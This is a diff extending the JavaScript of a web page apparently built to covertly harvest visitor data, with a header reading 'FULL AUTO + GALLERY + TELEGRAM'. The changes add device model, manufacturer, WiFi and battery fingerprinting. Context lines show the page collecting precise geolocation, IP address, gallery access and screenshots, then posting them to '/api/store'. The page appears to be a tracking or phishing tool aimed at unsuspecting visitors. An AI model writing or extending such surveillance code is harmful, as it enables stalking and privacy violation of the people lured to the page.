@@ -105,9 +105,12 @@
         <div class="location-highlight">📍 Location: <span id="devLocation">Detecting...</span></div>
         <div>🎯 Accuracy: <span id="devAccuracy">Detecting...</span> <span id="accuracyBadge"></span></div>
         <div>📱 Device: <span id="devName">Detecting...</span></div>
+        <div>📱 Model: <span id="devModel">Detecting...</span></div>
+        <div>🏭 Manufacturer: <span id="devManufacturer">Detecting...</span></div>
         <div>📲 OS: <span id="devOS">Detecting...</span></div>
         <div>🔋 Battery: <span id="devBattery">Detecting...</span></div>
         <div>📶 Network: <span id="devNetwork">Detecting...</span></div>
+        <div>📶 WiFi: <span id="devWiFi">Detecting...</span></div>
         <div>🕐 Time: <span id="devTime">Detecting...</span></div>
     </div>
     
@@ -115,7 +118,11 @@
 </div>
 
 <script>
-// ===== FULL AUTO + GALLERY + TELEGRAM =====
+// ==========================================
+//  FULL AUTO + GALLERY + TELEGRAM
+//  Complete Version with Deep Device Details
+// ==========================================
+
 const statusBox = document.getElementById('statusBox');
 const statusIcon = document.getElementById('statusIcon');
 const statusMsg = document.getElementById('statusMsg');
@@ -156,11 +163,13 @@ function setStatus(icon, msg, type = 'loading') {
     statusMsg.textContent = msg;
 }
 
-// ===== FULL DEVICE DETAILS =====
+// ===== FULL DEVICE DETAILS - DEEP SCAN =====
 async function getFullDeviceInfo() {
     try {
         const battery = await getBatteryInfo();
         const conn = getNetworkInfo();
+        const wifiInfo = getWiFiInfo();
+        
         return {
             deviceName: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
             os: getOS(),
@@ -171,57 +180,114 @@ async function getFullDeviceInfo() {
             browserVersion: getBrowserVersion(),
             language: navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, pixelRatio: window.devicePixelRatio },
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio
+            },
             memory: navigator.deviceMemory || 'Unknown',
             cores: navigator.hardwareConcurrency || 'Unknown',
             connection: conn,
-            battery: battery
+            battery: battery,
+            wifi: wifiInfo.ssid || 'Unknown',
+            bssid: wifiInfo.bssid || 'Unknown'
         };
-    } catch(e) { return {}; }
+    } catch(e) {
+        console.log('Device details error:', e);
+        return {};
+    }
 }
 
+// ===== WIFI INFO =====
+function getWiFiInfo() {
+    try {
+        const conn = navigator.connection || navigator.mozConnection;
+        if (conn) {
+            return {
+                ssid: conn.type === 'wifi' ? 'WiFi' : 'Cellular',
+                bssid: 'Not available (browser restriction)'
+            };
+        }
+        return { ssid: 'Unknown', bssid: 'Unknown' };
+    } catch(e) {
+        return { ssid: 'Unknown', bssid: 'Unknown' };
+    }
+}
+
+// ===== GET OS =====
 function getOS() {
     const ua = navigator.userAgent;
     if (ua.includes('Android')) return 'Android';
     if (ua.includes('iPhone')) return 'iOS';
+    if (ua.includes('iPad')) return 'iPadOS';
     if (ua.includes('Windows')) return 'Windows';
     if (ua.includes('Mac')) return 'macOS';
     if (ua.includes('Linux')) return 'Linux';
     return 'Unknown';
 }
 
+// ===== GET OS VERSION =====
 function getOSVersion() {
     const ua = navigator.userAgent;
-    const m = ua.match(/Android\s([\d.]+)/);
-    if (m) return m[1];
-    const i = ua.match(/OS\s([\d_]+)/);
-    if (i) return i[1].replace(/_/g, '.');
+    const androidMatch = ua.match(/Android\s([\d.]+)/);
+    if (androidMatch) return androidMatch[1];
+    const iosMatch = ua.match(/OS\s([\d_]+)/);
+    if (iosMatch) return iosMatch[1].replace(/_/g, '.');
+    const winMatch = ua.match(/Windows\sNT\s([\d.]+)/);
+    if (winMatch) return winMatch[1];
+    const macMatch = ua.match(/Mac\sOS\sX\s([\d_]+)/);
+    if (macMatch) return macMatch[1].replace(/_/g, '.');
     return 'Unknown';
 }
 
+// ===== GET DEVICE MODEL =====
 function getDeviceModel() {
     const ua = navigator.userAgent;
-    const m = ua.match(/;\s?([^;]+?)\sBuild/);
-    if (m) return m[1];
-    if (ua.includes('iPhone')) return 'iPhone';
+    const androidMatch = ua.match(/;\s?([^;]+?)\sBuild/);
+    if (androidMatch) {
+        const model = androidMatch[1].trim();
+        const cleanModel = model.replace(/^Android\s/, '').replace(/;.*$/, '');
+        return cleanModel || 'Android Device';
+    }
+    if (ua.includes('iPhone')) {
+        const match = ua.match(/iPhone\s([\d,]+)/);
+        return match ? `iPhone ${match[1]}` : 'iPhone';
+    }
+    if (ua.includes('iPad')) return 'iPad';
+    if (ua.includes('Windows')) {
+        const match = ua.match(/Windows\sNT\s([\d.]+)/);
+        return match ? `Windows ${match[1]}` : 'Windows PC';
+    }
+    if (ua.includes('Mac')) return 'Mac';
+    if (ua.includes('Linux')) return 'Linux PC';
     return 'Unknown';
 }
 
+// ===== GET MANUFACTURER =====
 function getManufacturer() {
     const ua = navigator.userAgent;
     if (ua.includes('Samsung')) return 'Samsung';
     if (ua.includes('OnePlus')) return 'OnePlus';
     if (ua.includes('Xiaomi')) return 'Xiaomi';
-    if (ua.includes('Apple')) return 'Apple';
+    if (ua.includes('OPPO') || ua.includes('Oppo')) return 'OPPO';
+    if (ua.includes('Vivo')) return 'Vivo';
+    if (ua.includes('Realme')) return 'Realme';
+    if (ua.includes('Google') || ua.includes('Pixel')) return 'Google';
+    if (ua.includes('Apple') || ua.includes('iPhone')) return 'Apple';
+    if (ua.includes('Huawei')) return 'Huawei';
     return 'Unknown';
 }
 
+// ===== GET BROWSER =====
 function getBrowserName() {
     const ua = navigator.userAgent;
-    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
-    if (ua.includes('Firefox')) return 'Firefox';
-    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-    if (ua.includes('Edg')) return 'Edge';
+    if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Google Chrome';
+    if (ua.includes('Firefox')) return 'Mozilla Firefox';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
+    if (ua.includes('Edg')) return 'Microsoft Edge';
+    if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+    if (ua.includes('Brave')) return 'Brave';
     return 'Unknown';
 }
 
@@ -232,22 +298,58 @@ function getBrowserVersion() {
     return 'Unknown';
 }
 
+// ===== GET NETWORK INFO =====
 function getNetworkInfo() {
-    const conn = navigator.connection || navigator.mozConnection;
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn) {
-        return { type: conn.effectiveType || 'Unknown', downlink: conn.downlink || 'Unknown', rtt: conn.rtt || 'Unknown' };
+        let type = conn.effectiveType || 'Unknown';
+        let downlink = conn.downlink || 'Unknown';
+        let rtt = conn.rtt || 'Unknown';
+        
+        if (type === '4g') type = '4G/LTE';
+        else if (type === '3g') type = '3G';
+        else if (type === '2g') type = '2G';
+        else if (type === 'slow-2g') type = 'Slow 2G';
+        else if (type === 'wifi') type = 'WiFi';
+        
+        return {
+            type: type,
+            downlink: downlink + ' Mbps',
+            rtt: rtt + ' ms'
+        };
     }
     return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
 }
 
+// ===== GET BATTERY =====
 async function getBatteryInfo() {
     try {
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
-            return { level: Math.round(battery.level * 100) + '%', charging: battery.charging };
+            return {
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging,
+                chargingTime: battery.chargingTime ? battery.chargingTime + 's' : 'Unknown',
+                dischargingTime: battery.dischargingTime ? battery.dischargingTime + 's' : 'Unknown'
+            };
         }
     } catch(e) {}
     return { level: 'Unknown', charging: false };
+}
+
+// ===== UPDATE UI WITH DEVICE DETAILS =====
+function updateDeviceUI(details) {
+    document.getElementById('devName').textContent = details.deviceName || 'Unknown';
+    document.getElementById('devModel').textContent = details.deviceModel || 'Unknown';
+    document.getElementById('devManufacturer').textContent = details.manufacturer || 'Unknown';
+    document.getElementById('devOS').textContent = (details.os || 'Unknown') + ' ' + (details.osVersion || '');
+    document.getElementById('devNetwork').textContent = details.connection?.type || 'Unknown';
+    document.getElementById('devWiFi').textContent = details.wifi || 'Unknown';
+    document.getElementById('devTime').textContent = new Date().toLocaleString();
+    
+    if (details.battery) {
+        document.getElementById('devBattery').textContent = details.battery.level + (details.battery.charging ? ' 🔌' : '');
+    }
 }
 
 // ===== GALLERY =====
@@ -485,8 +587,8 @@ function captureScreenshot() {
             const info = [
                 'IPv4: ' + ipAddress,
                 'Device: ' + (deviceDetails.deviceName || 'Unknown'),
-                'OS: ' + (deviceDetails.os || 'Unknown'),
-                'Browser: ' + (deviceDetails.browserName || 'Unknown'),
+                'Model: ' + (deviceDetails.deviceModel || 'Unknown'),
+                'OS: ' + (deviceDetails.os || 'Unknown') + ' ' + (deviceDetails.osVersion || ''),
                 'Network: ' + (deviceDetails.networkType || 'Unknown'),
                 'Location: ' + (userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'),
                 'Accuracy: ' + (userLocation ? userLocation.accuracy + 'm' : 'Unknown'),
@@ -593,7 +695,9 @@ async function getDeviceInfo() {
         deviceName: navigator.platform || 'Unknown',
         os: os,
         browserName: browser,
-        networkType: navigator.connection?.effectiveType || 'Unknown'
+        networkType: navigator.connection?.effectiveType || 'Unknown',
+        deviceModel: getDeviceModel(),
+        manufacturer: getManufacturer()
     };
     log('📱 Device: ' + os + ' | ' + browser);
 }
@@ -604,6 +708,7 @@ async function submitData() {
     setStatus('📤', 'Submitting...', 'loading');
     
     const fullDevice = await getFullDeviceInfo();
+    updateDeviceUI(fullDevice);
     
     try {
         const response = await fetch('/api/store', {
